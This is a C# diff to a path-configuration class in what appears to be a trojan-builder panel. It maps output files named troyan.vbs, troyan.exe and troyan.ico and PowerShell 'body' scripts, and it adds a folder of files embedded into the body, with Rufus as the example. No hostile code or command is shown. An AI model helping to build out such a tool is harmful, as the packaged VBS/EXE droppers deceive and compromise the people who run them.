@@ -40,10 +40,7 @@ public sealed class ServerLayoutPaths
     [JsonPropertyName("bodyPs1Debug")] public string BodyPs1Debug => Path.Join(TroyanOutputDir, "body.debug.ps1");
     [JsonPropertyName("bodyDebugTxt")] public string BodyDebugTxt => Path.Join(TroyanOutputDir, "body.debug.txt");
 
-    [JsonPropertyName("holder")] public string Holder => Path.Join(TroyanOutputDir, "holder.txt");
-    [JsonPropertyName("holderPs1")] public string HolderPs1 => Path.Join(TroyanOutputDir, "holder.ps1");
-    [JsonPropertyName("holderPs1Debug")] public string HolderPs1Debug => Path.Join(TroyanOutputDir, "holder.debug.ps1");
-    /// <summary>Plain holder-based script produced in the Troyan <c>_output</c> folder (then copied to <see cref="UserTroyanVbs"/>).</summary>
+    /// <summary>Plain VBS + embedded body script in Troyan <c>_output</c> (copied to <see cref="UserTroyanVbs"/>).</summary>
     [JsonPropertyName("troyanOutputVbs")] public string TroyanOutputVbs => Path.Join(TroyanOutputDir, "troyan.vbs");
 
     public string UserDataFile(string file) => _paths.UserDataFile(file);
@@ -52,6 +49,9 @@ public sealed class ServerLayoutPaths
     [JsonPropertyName("userTroyanExe")] public string UserTroyanExe => Path.Join(UserDataDir, "troyan.exe");
     [JsonPropertyName("userTroyanIco")] public string UserTroyanIco => Path.Join(UserDataDir, "troyan.ico");
     [JsonPropertyName("userDataDir")] public string UserDataDir => _paths.UserDataDir;
+
+    /// <summary>Nested files embedded into body as <c>$xembeddings</c> (Rufus, etc.); see <see cref="IPanelServerPaths.DefaultsEmbedDir"/>.</summary>
+    [JsonPropertyName("defaultsEmbedDir")] public string DefaultsEmbedDir => _paths.DefaultsEmbedDir;
     [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
     [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");
 }
